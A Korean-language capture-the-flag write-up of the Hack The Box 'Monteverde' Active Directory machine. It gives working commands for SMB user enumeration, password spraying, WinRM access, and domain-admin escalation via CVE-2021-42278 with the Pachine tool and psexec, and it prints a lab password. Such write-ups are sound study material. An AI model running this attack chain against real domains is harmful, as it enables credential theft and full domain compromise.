# HTB-MONTEVERDE
```bash
OS: Windows(AD)
DATE: 26.09.21
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 포트 검사를 위해 전체 포트 검사와 상세 포트 검사, UDP 포트 검사를 실시했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sUV --top-ports 100 IP
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 IP | tee nmap
```
포트 검사를 실시하니 88(Kerberos), 389(LDAP) 서비스가 작동하는 것을 보아 AD DC 서버라는 것을 알 수 있었다.

## Initial Access
초기 접근을 위해 SMB 서비스를 가장 먼저 파고들었다. nxc를 사용하여 유저 이름들을 뽑아낼 수 있는지 확인하는 옵션을 추가하여 유저 이름들을 얻었다.
```bash
nxc smb IP -u '' -p '' --users
```
따라서 불필요한 내용을 걸러내고 유저 이름만 추출하는 명령어를 사용하여 user list로 만들어주었다.
```bash
nxc smb IP -u '' -p '' --users | awk '$5 !~ /^\[/ && $5 != "-Username-" {print $5}' 
```
이제 유저명을 얻었으니 AS-REP Roasting 공격 및 다른 것들을 살펴보았지만 아무것도 할 수 없었다. 따라서 user list를 패스워드에도 넣어서 유저 이름과 같은 패스워드를 사용하고 있는 유저가 있는지 password spray를 진행하여 **SABatchJobs**라는 유저의 크리덴셜을 얻을 수 있었다.
```bash
nxc smb IP -u users -p users 
```
따라서 바로 SMB 폴더를 확인해보았다. SABatchJobs 유저는 **USERS$** 폴더의 READ 권한이 있다는 것을 알게 되어 smbclient를 이용하여 폴더에 들어가보았다.
```bash
smbclient //IP/USERS$ -U SABatchJobs
```
폴더 안에는 유저 이름으로 보이는 폴더 4개가 있었다. 모두 ls 명령어를 사용하여 확인해본 결과 mhope라는 디렉토리에만 **azure.xml**이라는 파일이 있었다. 해당 파일을 get하여 로컬로 옮긴 후 확인해본 결과 평문 비밀번호가 있었다. 따라서 mhope라는 유저명과 조합하여 SMB 로그인이 가능한지 확인해본 결과 알맞은 크리덴셜이라는 것을 알게 되었다.
```bash
nxc smb IP -u mhope -p PASS
```
따라서 WinRM 접속 가능 여부도 확인한 결과 접속이 가능하여 mhope 유저의 쉘을 얻을 수 있었다.
```bash
nxc winrm IP -u mhope -p PASS
```
![user](attach_real/Pasted%20image%2020260921223144.png)

## Privilege Escalation
초기 쉘을 얻고 많은 것을 확인해본 결과, `whoami /all` 명령어를 통해 해당 유저가 **SeMachineAccountPrivilege**라는 권한을 가진다는 것을 알게 되었다. 해당 권한은 사용자가 도메인에 컴퓨터 계정을 추가할 수 있는 권한이었다. 따라서 해당 권한으로 권한 상승이 가능한지 구글에 검색한 결과 CVE-2021-42278이라는 취약점을 이용하여 권한 상승이 가능하다는 것을 알게 되었다. 따라서 [pachine](https://github.com/ly4k/Pachine/tree/main)이라는 도구를 사용하여 권한 상승을 할 수 있었다.
가장 먼저 대상이 취약한지 스캔부터 해주었다.
```bash
python3 exploit.py -dc-host monteverde.megabank.local -dc-ip IP -scan 'megabank.local/mhope:4n0therD4y@n0th3r$'
Impacket v0.14.0.dev0+20260703.172754.6d62ba59 - Copyright Fortra, LLC and its affiliated companies

[*] Domain controller megabank.local is most likely vulnerable
```
취약하다는 것을 확인한 후 exploit을 실시했다.
```bash
python3 exploit.py -dc-host monteverde.megabank.local -spn cifs/monteverde.megabank.local -impersonate administrator 'megabank.local/mhope:4n0therD4y@n0th3r$'
[*] Requesting S4U2self
[*] Got TGS for administrator@megabank.local for monteverde@MEGABANK.LOCAL
[*] Changing sname from monteverde@MEGABANK.LOCAL to cifs/monteverde.megabank.local@MEGABANK.LOCAL
[*] Changed machine account name from DESKTOP-1UJ495I8$ to monteverde
[*] Saving ticket in administrator@megabank.local.ccache
```
따라서 익스플로잇에 성공한 후 티켓을 환경변수에 등록해주었다. impacket 도구는 KRB5CCNAME을 보고 어떤 티켓을 사용할지 정하기 때문에 $PWD로 절대 경로를 붙여 방금 저장한 ccache를 가리키게 했다.
```bash
export KRB5CCNAME=$PWD/administrator@megabank.local.ccache
```
이후 psexec를 사용하여 쉘을 획득했다.
```bash
psexec.py -k -no-pass -dc-ip IP 'megabank.local/administrator@monteverde.megabank.local'
```
![system](attach_real/Pasted%20image%2020260921225143.png)

## New Inform
- 유저 이름으로 패스워드도 시도해볼 것.
- **SeMachineAccountPrivilege**: 사용자가 도메인에 컴퓨터 계정을 추가할 수 있는 권한이다.
- **CVE-2021-42278**: sAMAccountName 검증 누락. 원래 머신 계정의 sAMAccountName은 관례상 끝에 $가 붙는다. 그런데 AD가 머신 계정 이름을 검증하지 않아서, $ 없이 기존 DC와 똑같은 이름으로 계정을 만들거나 rename할 수 있었다. 즉 MONTEVERDE$가 이미 있는데도 $ 없이 같은 이름의 머신 계정을 만들 수 있었다.
- DC 호스트: 그 도메인 안에서 실제로 돌아가는 서버 컴퓨터 한 대의 이름.
- -spn cifs/: 최종적으로 받을 서비스 티켓의 종류. cifs/는 SMB 원격 실행용이라 psexec로 쉘을 따려면 이걸 선택해야 한다.
- psexec.py -k -no-pass: -k는 Kerberos 티켓으로 인증하라는 뜻. -no-pass는 비밀번호를 묻지 말라는 것. -k로만 티켓을 사용하기 때문이다.
- 모든 도구에 -dc-ip 옵션을 추가해줘야 한다.